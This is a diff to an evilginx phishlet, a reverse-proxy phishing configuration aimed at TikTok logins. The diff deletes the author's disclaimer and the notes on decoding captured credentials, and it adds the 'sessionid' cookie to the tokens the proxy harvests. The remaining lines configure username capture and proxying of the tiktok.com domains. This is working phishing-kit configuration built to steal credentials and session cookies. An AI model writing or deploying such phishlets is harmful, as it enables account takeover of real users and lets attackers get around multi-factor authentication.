@@ -1,9 +1,3 @@
-# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
-# PLEASE DO NOT MISUSE THIS PHISHLET.
-
-# All Post Requests Fields Get Encoded During Requests to Server By titok javascripts.
-# Below is the Table Which You can use to decode your captured credentials in evilginx manually.
-
 author: '@An0nUD4Y'
 min_ver: '2.3.0'
 proxy_hosts:
@@ -50,7 +44,7 @@ sub_filters:
 
 auth_tokens:
   - domain: '.tiktok.com'
-    keys: ['.*,regexp']
+    keys: ['sessionid','.*,regexp']
 credentials:
   username:
     key: 'account'
@@ -92,4 +86,3 @@ login:
 
 
 # OTHER REMAINED CODES CAN BE FOUND USING POST REQUEST ANALYSIS.
-
